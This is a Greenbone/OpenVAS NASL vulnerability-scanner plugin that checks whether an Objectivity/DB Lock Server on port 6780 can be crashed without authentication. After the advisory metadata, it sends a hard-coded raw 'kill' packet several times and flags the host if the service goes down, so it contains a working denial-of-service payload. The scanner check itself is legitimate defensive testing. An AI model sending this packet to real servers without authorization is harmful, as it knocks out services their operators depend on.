if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900270" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-02-05 04:12:38 +0100 (Sat, 05 Feb 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Objectivity/DB Lock Server Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/42901" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/45803" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/64699" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15988/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 6780 );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to cause the
application to crash by sending specific commands." );
	script_tag( name: "affected", value: "Objectivity/DB Version R10" );
	script_tag( name: "insight", value: "The flaw is due to Lock Server component allowing to perform
various administrative operations without authentication." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Objectivity/DB Lock Server and is prone
to denial of service vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
oolsPort = 6780;
if(!get_port_state( oolsPort )){
	exit( 0 );
}
ools_kill_data = raw_string( 0x0d, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77, 0x00, 0x00, 0x00, 0x04, 0xad, 0xc4, 0xae, 0xda, 0x9e, 0x48, 0xd6, 0x44, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 );
for(i = 0;i < 5;i++){
	soc = open_sock_tcp( oolsPort );
	if(!soc){
		exit( 0 );
	}
	send( socket: soc, data: ools_kill_data );
	close( soc );
	sleep( 5 );
	soc = open_sock_tcp( oolsPort );
	if(!soc){
		security_message( oolsPort );
		exit( 0 );
	}
	close( soc );
}

